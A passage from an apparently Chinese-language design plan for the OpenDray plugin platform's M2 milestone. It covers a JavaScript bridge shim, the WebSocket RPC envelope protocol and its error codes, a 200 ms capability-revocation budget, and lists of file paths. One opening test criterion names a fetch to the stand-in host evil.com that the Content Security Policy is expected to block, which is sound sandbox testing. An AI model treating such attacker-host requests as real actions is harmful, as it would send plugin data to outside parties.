- CSP 强制执行 `script-src 'self' 'unsafe-eval'` — 获取 https://evil.com 失败
- 200 毫秒内的能力热撤销
```

### 预加载 JS 填充 (从 `/api/plugins/.runtime/opendray-shim.js` 处的嵌入式 Go 资产提供)

该填充**不**在插件包中 — 它由 Flutter 宿主注入或从已知路径提供。大小预算：40 行 (在 T16 中强制执行)。

```js
(() => {
  const calls = new Map();
  let nextId = 1;
  function call(ns, method, args) {
    const id = String(nextId++);
    return new Promise((resolve, reject) => {
      calls.set(id, { resolve, reject });
      window.OpenDrayBridge.postMessage(JSON.stringify({ v: 1, id, ns, method, args }));
    });
  }
  window.__opendray_onMessage = (raw) => {
    const env = JSON.parse(raw);
    const pending = calls.get(env.id);
    if (!pending) return;
    calls.delete(env.id);
    if (env.error) pending.reject(new Error(`${env.error.code}: ${env.error.message}`));
    else pending.resolve(env.result);
  };
  const nsProxy = (ns, methods) => Object.fromEntries(
    methods.map(m => [m, (...args) => call(ns, m, args)]));
  window.opendray = {
    version: "1",
    plugin: window.__opendray_plugin_ctx || {},
    workbench: nsProxy("workbench", ["showMessage","openView","updateStatusBar","runCommand","theme","onThemeChange"]),
    storage:   nsProxy("storage",   ["get","set","delete","list"]),
    events:    { subscribe: (name, cb) => { /* 信封流处理 */ }, publish: (n, p) => call("events","publish",[n,p]) },
  };
})();
```

---

## 11. 桥接 WS 协议 — 具体语义

### 请求信封 (客户端 → 服务器)

```json
{ "v": 1, "id": "42", "ns": "storage", "method": "set",
  "args": ["cards", [{"id":"a","title":"x"}]] }
```

- `v` 必填，必须等于 `1`。不匹配 → 服务器返回 `{error:{code:"EINVAL",message:"unsupported version"}}`。
- 请求/响应 RPC 需要 `id`；发后不管 (fire-and-forget) 则缺省 (M2 中未使用)。
- `ns` + `method` 必填。
- `args` 是一个 JSON 数组 (位置参数) 或对象 (命名参数)。M2 实现将其作为 `json.RawMessage` 传递给分发器。

### 响应信封 (服务器 → 客户端)

```json
{ "v": 1, "id": "42", "result": null }
```

### 错误信封

```json
{ "v": 1, "id": "42", "error": { "code": "EPERM", "message": "storage not granted" } }
```

错误代码 (稳定集合, 见 04-bridge-api.md)：`EPERM`, `EINVAL`, `ENOENT`, `ETIMEOUT`, `EUNAVAIL`, `EINTERNAL`。

### 流信封 (服务器 → 客户端, 用于 `events.subscribe`)

```json
{ "v": 1, "id": "42", "stream": "chunk", "data": { "type": "session.idle", "sessionId": "s1" } }
{ "v": 1, "id": "42", "stream": "end" }
```

Subscribe 立即返回一个带有 `{result: {subId: "42"}}` 的响应信封，然后不断发出分块直到客户端取消订阅（新方法 `events.unsubscribe {subId:"42"}`）或连接关闭。

### 握手

1. Flutter 开启带有 bearer 令牌的 WS。
2. 服务器验证源 + JWT，执行升级。
3. 服务器立即发送欢迎信封：`{v:1, ns:"bridge", method:"welcome", args:[{plugin:"kanban", version:"1.0.0", publisher:"opendray-examples", dataDir:"/abs/path"}]}`。客户端填充将其存储在 `window.__opendray_plugin_ctx`。
4. 客户端现在可以自由发起调用。

### 故障模式

- **已知命名空间下的未知方法：** `{error:{code:"EUNAVAIL",message:"storage.frobnicate not implemented"}}`。连接保持开启。
- **能力拒绝：** `{error:{code:"EPERM",message:"storage not granted"}}`。连接保持开启。
- **速率限制超出：** `{error:{code:"ETIMEOUT",message:"rate limit exceeded", data:{retryAfterMs:12345}}}`。连接保持开启。
- **请求中途桥接断开：** 当 WS 关闭事件触发时，任何待处理调用的 promise 都会在客户端被拒绝。填充遍历 `calls` 映射并全部拒绝。
- **信封 `v != 1`：** EINVAL，连接保持开启。(前向兼容：v2 客户端可以降级。)
- **JSON 格式错误：** EINVAL 且 `message:"invalid JSON envelope"`，连接保持开启。连续三个错误信封将以代码 1008 (政策违规) 关闭连接。
- **流活跃时撤销同意 (T12 流程)：** 服务器发送 `{stream:"end", error:{code:"EPERM"}}` 然后主动在服务端调用 `events.unsubscribe`；填充进行清理。

### 200 毫秒撤销路径 (按步骤时间预算)

| 步骤 | 预算 |
|---|---|
| HTTP DELETE 到达网关 | 0 毫秒 |
| `UpdateConsentPerms` SQL | ≤30 毫秒 (本地 PG) |
| `bridgeMgr.InvalidateConsent(plugin,cap)` 发布 | ≤1 毫秒 |
| 每个活跃连接的撤回处理程序翻转其脏能力标志 | ≤5 毫秒 (广播) |
| 下一次 `storage.set` 调用 Gate.Check 看到脏标志 | ≤1 毫秒 |
| 将 EPERM 信封写入 WS | ≤5 毫秒 |
| WS 写入传输到 Flutter | ≤20 毫秒 (区域网) |
| Flutter 填充拒绝 promise | ≤5 毫秒 |
| **总计** | **≤67 毫秒** — 远在 200 毫秒 SLO 之内 |

---

## 12. 执行摘要 (≤200 字)

**总任务：** 26 (T1–T25 加 T16b)。**关键路径：** 18 个顺序步骤。**目标日程：** 在 T1+T3+T5 第一个 PR 缝隙合并后，由一名后端工程师 + 一名 Flutter 工程师并行运行 ≈5 个工作周。

**最大的未知数：** 端到端 200 毫秒热撤销 SLO。§11 中的协议 + 管理器设计在理论上可以轻松满足，但低配机器上的 CI 可能会产生抖动；缓解措施是在 `TestE2E_KanbanFullLifecycle` 中使用硬编码的 `time.Now()` 期限断言，并在每次修改 `plugin/bridge/` 的 PR 上备份 `go test -bench` 运行。

**建议的首个任务：** **T1 — 使用 activityBar/views/panels 扩展 ContributesV1。** 仅为增量，零运行时行为更改，解锁验证器 (T2)、注册表 (T3)、兼容性 (T4)、参考插件 (T22) 以及每个 Flutter DTO。根据 §9 与 T3 和 T5 一起发布。

**不可协商的界限：** 不包含 `fs.*`/`exec.*`/`http.*`/`session.*`/`secret.*`/`ui.*`/`commands.execute`/`tasks.*`/`clipboard.*`/`llm.*`/`git.*`/`telegram.*`/`logger.*` 命名空间；不包含宿主边车管理器；不包含市场客户端；不包含热重载。这些属于 M3/M4/M6。如果任务开始向它们漂移，请停止并在 §1 中归档延迟项。

---

## 相关文件路径 (全部为绝对路径)

**设计合约：**
- `/home/linivek/workspace/opendray/docs/plugin-platform/12-roadmap.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/02-manifest.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/03-contribution-points.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/04-bridge-api.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/05-capabilities.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/07-lifecycle.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/08-workbench-slots.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/10-security.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/M1-PLAN.md`
- `/home/linivek/workspace/opendray/docs/plugin-platform/SUMMARY.md`

**现有代码锚点 (M1)：**
- `/home/linivek/workspace/opendray/plugin/manifest.go`
- `/home/linivek/workspace/opendray/plugin/manifest_validate.go`
- `/home/linivek/workspace/opendray/plugin/bridge/capabilities.go`
- `/home/linivek/workspace/opendray/plugin/contributions/registry.go`
- `/home/linivek/workspace/opendray/plugin/compat/synthesize.go`
- `/home/linivek/workspace/opendray/plugin/commands/dispatcher.go`
- `/home/linivek/workspace/opendray/plugin/install/install.go`
- `/home/linivek/workspace/opendray/plugin/install/consent.go`
- `/home/linivek/workspace/opendray/plugin/hooks.go`
- `/home/linivek/workspace/opendray/plugin/runtime.go`
- `/home/linivek/workspace/opendray/plugin/e2e_test.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_consents.go`
- `/home/linivek/workspace/opendray/kernel/store/migrations/011_plugin_kv.sql`
- `/home/linivek/workspace/opendray/kernel/store/migrations/012_plugin_secret.sql`
- `/home/linivek/workspace/opendray/gateway/server.go`
- `/home/linivek/workspace/opendray/gateway/plugins_install.go`
- `/home/linivek/workspace/opendray/gateway/plugins_command.go`
- `/home/linivek/workspace/opendray/gateway/workbench.go`
- `/home/linivek/workspace/opendray/gateway/ws.go`
- `/home/linivek/workspace/opendray/app/pubspec.yaml`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_service.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/workbench_models.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/command_palette.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/status_bar_strip.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/keybindings.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/menu_slot.dart`
- `/home/linivek/workspace/opendray/app/lib/features/dashboard/dashboard_page.dart`
- `/home/linivek/workspace/opendray/app/lib/features/session/session_page.dart`
- `/home/linivek/workspace/opendray/app/lib/core/api/api_client.dart`

**待创建的文件 (M2)：**
- `/home/linivek/workspace/opendray/plugin/bridge/protocol.go`
- `/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/manager.go`
- `/home/linivek/workspace/opendray/plugin/bridge/manager_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_workbench.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_workbench_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_storage.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_storage_test.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_events.go`
- `/home/linivek/workspace/opendray/plugin/bridge/api_events_test.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_kv.go`
- `/home/linivek/workspace/opendray/kernel/store/plugin_kv_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_bridge.go`
- `/home/linivek/workspace/opendray/gateway/plugins_bridge_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_assets_csp_test.go`
- `/home/linivek/workspace/opendray/gateway/plugins_consents.go`
- `/home/linivek/workspace/opendray/gateway/plugins_consents_test.go`
- `/home/linivek/workspace/opendray/gateway/workbench_stream.go`
- `/home/linivek/workspace/opendray/gateway/workbench_stream_test.go`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/manifest.json`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/README.md`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/index.html`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/main.js`
- `/home/linivek/workspace/opendray/plugins/examples/kanban/ui/styles.css`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/activity_bar.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/view_host.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/panel_slot.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host_desktop.dart`
- `/home/linivek/workspace/opendray/app/lib/features/workbench/plugin_bridge_channel.dart`
- `/home/linivek/workspace/opendray/app/lib/features/settings/plugin_consents_page.dart`
